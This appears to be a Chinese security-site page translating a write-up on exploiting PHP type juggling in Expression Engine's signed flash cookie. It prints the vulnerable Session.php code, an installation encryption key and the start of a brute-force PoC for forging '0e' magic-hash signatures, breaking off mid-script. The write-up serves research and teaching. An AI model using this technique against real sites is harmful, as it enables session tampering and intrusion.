<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】从弱类型利用以及对象注入到SQL注入 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="从弱类型利用以及对象注入到SQL注入,代码审计,php反序列化安全"/>
    
        <meta name="description" content="在一次针对某套CMS的安全测试中，当我尝试使用“admin”的用户名来登录它时，服务器返回了一个包含PHP序列化数据的cookie。 大家都知道，未经处理直接反序列化用户可控数据可能会导致命令执行等诸多安全问题。本文就此安全问题展开了详细的分析，并提供了POC。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】从弱类型利用以及对象注入到SQL注入</h2>
                <div class="article-msg">
                    <span class="time">2017-02-10 11:37:00</span>
                    
                                        <span class="read">阅读：20581次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3486"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3486" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/"
                             target="_blank">来源： foxglovesecurity.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=419303956" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01cc1fef36795c3ff3.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=419303956" style="color:#848e99;">西风微雨</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><img src="http://p8.qhimg.com/t01c27498e0b280a670.jpg" title="t0162fdbad2f5ab28fd.jpg" alt="http://p1.qhimg.com/t0162fdbad2f5ab28fd.jpg"/></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=419303956" target="_blank" textvalue="西风微雨" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">西风微雨</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">预估稿费：200RMB</span></span></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></span></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最近我在针对某个目标找寻安全漏洞时，发现了其中一个运行Expression Engine(一个内容管理平台)的服务器，这个系统引起了我的注意，因为当我尝试使用“admin”的用户名来登录它时，服务器返回了一个包含PHP序列化数据的cookie。 大家都知道，未经处理直接反序列化用户可控数据可能会导致命令执行等诸多安全问题。这时候我想与其进行黑盒测试，不如试试能不能下载到目标系统的源代码，通过审计源代码弄明白程序针对序列化数据进行了怎样的后续处理。 有了代码之后，我通过全局匹配查找cookie的处理流程，最后在文件“./system/ee/legacy/libraries/Session.php”发现cookie被用于了会话认证。 纵观Session.php，我们发现以下函数用于对序列化的cookie数据进行处理：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><pre class="brush:plain;toolbar:false">1282&nbsp;&nbsp;protected&nbsp;function&nbsp;_prep_flashdata()
1283&nbsp;&nbsp;{
1284&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($cookie&nbsp;=&nbsp;ee()-&gt;input-&gt;cookie(&#39;flash&#39;))
1285&nbsp;&nbsp;&nbsp;&nbsp;{
1286&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strlen($cookie)&nbsp;&gt;&nbsp;32)
1287&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
1288&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$signature&nbsp;=&nbsp;substr($cookie,&nbsp;-32);
1289&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$payload&nbsp;=&nbsp;substr($cookie,&nbsp;0,&nbsp;-32);
1290
1291&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(md5($payload.$this-&gt;sess_crypt_key)&nbsp;==&nbsp;$signature)
1292&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
1293&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;flashdata&nbsp;=&nbsp;unserialize(stripslashes($payload));
1294&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_age_flashdata();
1295
1296&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
1297&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
1298&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
1299&nbsp;&nbsp;&nbsp;&nbsp;}
1300
1301&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;flashdata&nbsp;=&nbsp;array();
1302&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们看到cookie在函数开始执行了两次检查判断，然后在第1293行上进行反序列化。那么，接下来我们就来看看我们的原始cookie能否通过检查并被成功反序列化: </span></p><pre class="brush:plain;toolbar:false">a%3A2%3A%7Bs%3A13%3A%22%3Anew%3Ausername%22%3Bs%3A5%3A%22admin%22%3Bs%3A12%3A%22%3Anew%3Amessage%22%3Bs%3A38%3A%22That+is+the+wrong+username+or+password%22%3B%7D3f7d80e10a3d9c0a25c5f56199b067d4</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">url编码解码:&nbsp;</span></p><pre class="brush:plain;toolbar:false">a:2:{s:13:&quot;:new:username&quot;;s:5:&quot;admin&quot;;s:12:&quot;:new:message&quot;;s:38:&quot;That&nbsp;is&nbsp;the&nbsp;wrong&nbsp;username&nbsp;or&nbsp;password&quot;;}3f7d80e10a3d9c0a25c5f56199b067d4</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果flash cookie存在的话，在1284行中，就将其赋值给$cookie变量，我们继续向下跟进，1286行中会检查cookie是否大于32位，如果大于32位，就将其最后32位取出并赋值给$signature,剩余部分存储在$payload之中：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;php&nbsp;-a
Interactive&nbsp;mode&nbsp;enabled
php&nbsp;&gt;&nbsp;$cookie&nbsp;=&nbsp;&#39;a:2:{s:13:&quot;:new:username&quot;;s:5:&quot;admin&quot;;s:12:&quot;:new:message&quot;;s:38:&quot;That&nbsp;is&nbsp;the&nbsp;wrong&nbsp;username&nbsp;or&nbsp;password&quot;;}3f7d80e10a3d9c0a25c5f56199b067d4&#39;;
php&nbsp;&gt;&nbsp;$signature&nbsp;=&nbsp;substr($cookie,&nbsp;-32);
php&nbsp;&gt;&nbsp;$payload&nbsp;=&nbsp;substr($cookie,&nbsp;0,&nbsp;-32);
php&nbsp;&gt;&nbsp;print&nbsp;&quot;Signature:&nbsp;$signature\n&quot;;
Signature:&nbsp;3f7d80e10a3d9c0a25c5f56199b067d4
php&nbsp;&gt;&nbsp;print&nbsp;&quot;Payload:&nbsp;$payload\n&quot;;
Payload:&nbsp;prod_flash=a:2:{s:13:&quot;:new:username&quot;;s:5:&quot;admin&quot;;s:12:&quot;:new:message&quot;;s:29:&quot;Invalid&nbsp;username&nbsp;or&nbsp;password.&quot;;}
php&nbsp;&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第1291行，我们比较了$payload.$this-&gt;sesscryptkey的md5 hash值，并将其与我们在cookie结尾处截取的$signature进行比较。 同时我们发现$this-&gt;sesscryptcookie的值是从文件“./system/user/config/config.php”中取得的，此加密字段是在系统安装时生成的。</span></p><pre class="brush:plain;toolbar:false">./system/user/config/config.php:$config[&#39;encryption_key&#39;]&nbsp;=&nbsp;&#39;033bc11c2170b83b2ffaaff1323834ac40406b79&#39;;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来我们就将此字段作为md5加密的盐值，尝试进行加密处理：</span></p><pre class="brush:plain;toolbar:false">php&nbsp;&gt;&nbsp;$salt&nbsp;=&nbsp;&#39;033bc11c2170b83b2ffaaff1323834ac40406b79&#39;;&nbsp;php&nbsp;&gt;&nbsp;print&nbsp;md5($payload.$salt);&nbsp;3f7d80e10a3d9c0a25c5f56199b067d4</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如上述结果显示，与$signature的值吻合，证实了我们的推理。 该系统进行md5检查的目的是防止数据被篡改过。然而表面上看起来，这种检查看起来足以防止这种篡改; 然而，由于PHP是弱类型语言，在执行变量比较时存在一些漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">弱类型之殃</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们首先通过一些简单的例子来看看什么是弱类型：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">/*&nbsp;php&nbsp;code*/
$a&nbsp;=&nbsp;1;
$b&nbsp;=&nbsp;1;
var_dump($a);
var_dump($b);
if&nbsp;($a&nbsp;==&nbsp;$b)&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same\n&quot;;&nbsp;}
else&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same\n&quot;;&nbsp;}
?&gt;
Output:
$&nbsp;php&nbsp;steps.php
int(1)
int(1)
a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same</pre><p style="text-indent: 2em; text-align: left;"><br/></p><pre class="brush:plain;toolbar:false">/*&nbsp;php&nbsp;code*/
$a&nbsp;=&nbsp;1;
$b&nbsp;=&nbsp;0;
var_dump($a);
var_dump($b);
if&nbsp;($a&nbsp;==&nbsp;$b)&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same\n&quot;;&nbsp;}
else&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same\n&quot;;&nbsp;}
?&gt;
Output:
$&nbsp;php&nbsp;steps.php
int(1)
int(0)
a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same</pre><p style="text-indent: 2em; text-align: left;"><br/></p><pre class="brush:php;toolbar:false">/*&nbsp;php&nbsp;code*/
$a&nbsp;=&nbsp;&quot;these&nbsp;are&nbsp;the&nbsp;same&quot;;
$b&nbsp;=&nbsp;&quot;these&nbsp;are&nbsp;the&nbsp;same&quot;;
var_dump($a);
var_dump($b);
if&nbsp;($a&nbsp;==&nbsp;$b)&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same\n&quot;;&nbsp;}
else&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same\n&quot;;&nbsp;}
?&gt;
Output:
$&nbsp;php&nbsp;steps.php
string(18)&nbsp;&quot;these&nbsp;are&nbsp;the&nbsp;same&quot;
string(18)&nbsp;&quot;these&nbsp;are&nbsp;the&nbsp;same&quot;
a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same
Output:
$&nbsp;php&nbsp;steps.php
string(22)&nbsp;&quot;these&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same&quot;
string(18)&nbsp;&quot;these&nbsp;are&nbsp;the&nbsp;same&quot;
a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上述例子都正如我们预想，但是我们来看看用字符串和整型变量比较的时候会发生什么：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">/*&nbsp;php&nbsp;code*/
$a&nbsp;=&nbsp;&quot;1&quot;;
$b&nbsp;=&nbsp;1;
var_dump($a);
var_dump($b);
if&nbsp;($a&nbsp;==&nbsp;$b)&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same\n&quot;;&nbsp;}
else&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same\n&quot;;&nbsp;}
?&gt;
Output:
php&nbsp;steps.php
string(1)&nbsp;&quot;1&quot;
int(1)
a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">看起来PHP帮助我们进行了类型强制转换。接下来，让我们看看当我们比较两个看起来像用科学记数法写成的整数字符串时会发生什么：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">/*&nbsp;php&nbsp;code*/
$a&nbsp;=&nbsp;&quot;0e111111111111111111111111111111&quot;;
$b&nbsp;=&nbsp;&quot;0e222222222222222222222222222222&quot;;
var_dump($a);
var_dump($b);
if&nbsp;($a&nbsp;==&nbsp;$b)&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same\n&quot;;&nbsp;}
else&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same\n&quot;;&nbsp;}
?&gt;
Output:
$&nbsp;php&nbsp;steps.php
string(32)&nbsp;&quot;0e111111111111111111111111111111&quot;
string(32)&nbsp;&quot;0e222222222222222222222222222222&quot;
a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">从上面可以看出，即使“$a”和“$b”都是字符串，并且明显是不同的值，使用宽松比较运算符也会导致结果为true，因为当PHP转换字符串到整型时，“0ex”总是变为0。这就是大家所说的弱类型。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&quot;花式利用&quot;宽松比较</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">结合弱类型的知识，我们再来看看hash值校验能否一如大家期待的那样继续防止数据篡改： if (md5($payload.$this-&gt;sess_crypt_key) == $signature)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">$payload的值和$signature的值可控，所以如果我们能够找到一个payload，当md5（$this-&gt;sesscryptkey)生成的hash值以0e开头并全部以数字结束，然后我们可以通过将$signature的hash设置为以0e开头并全部以数字结尾的值来绕过函数检查。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我通过搜寻网上的一些代码片段写成了一个的POC，用来不断生成md5（$payload.$ this-&gt;sesscryptkey），直到找到我需要的hash值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先看看未篡改的payload:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;php&nbsp;-a
Interactive&nbsp;mode&nbsp;enabled
php&nbsp;&gt;&nbsp;$cookie&nbsp;=&nbsp;&#39;a:2:{s:13:&quot;:new:username&quot;;s:5:&quot;admin&quot;;s:12:&quot;:new:message&quot;;s:38:&quot;That&nbsp;is&nbsp;the&nbsp;wrong&nbsp;username&nbsp;or&nbsp;password&quot;;}3f7d80e10a3d9c0a25c5f56199b067d4&#39;;
php&nbsp;&gt;&nbsp;$signature&nbsp;=&nbsp;substr($cookie,&nbsp;-32);
php&nbsp;&gt;&nbsp;$payload&nbsp;=&nbsp;substr($cookie,&nbsp;0,&nbsp;-32);
php&nbsp;&gt;&nbsp;print_r(unserialize($payload));
Array
(
[:new:username]&nbsp;=&gt;&nbsp;admin
[:new:message]&nbsp;=&gt;&nbsp;That&nbsp;is&nbsp;the&nbsp;wrong&nbsp;username&nbsp;or&nbsp;password
)
php&nbsp;&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我需要将数组中的‘That is the wrong username or password’修改为’taquito’</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们选定第一个字段[:new:username]进行暴力枚举</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">/*&nbsp;php&nbsp;code*/
set_time_limit(0);
define(&#39;HASH_ALGO&#39;,&nbsp;&#39;md5&#39;);
define(&#39;PASSWORD_MAX_LENGTH&#39;,&nbsp;8);
$charset&nbsp;=&nbsp;&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
$str_length&nbsp;=&nbsp;strlen($charset);
function&nbsp;check($garbage)
{
&nbsp;&nbsp;&nbsp;&nbsp;$length&nbsp;=&nbsp;strlen($garbage);
&nbsp;&nbsp;&nbsp;&nbsp;$salt&nbsp;=&nbsp;&quot;033bc11c2170b83b2ffaaff1323834ac40406b79&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$payload&nbsp;=&nbsp;&#39;a:2:{s:13:&quot;:new:username&quot;;s:&#39;.$length.&#39;:&quot;&#39;.$garbage.&#39;&quot;;s:12:&quot;:new:message&quot;;s:7:&quot;taquito&quot;;}&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;#echo&nbsp;&quot;Testing:&nbsp;&quot;&nbsp;.&nbsp;$payload&nbsp;.&nbsp;&quot;\n&quot;;
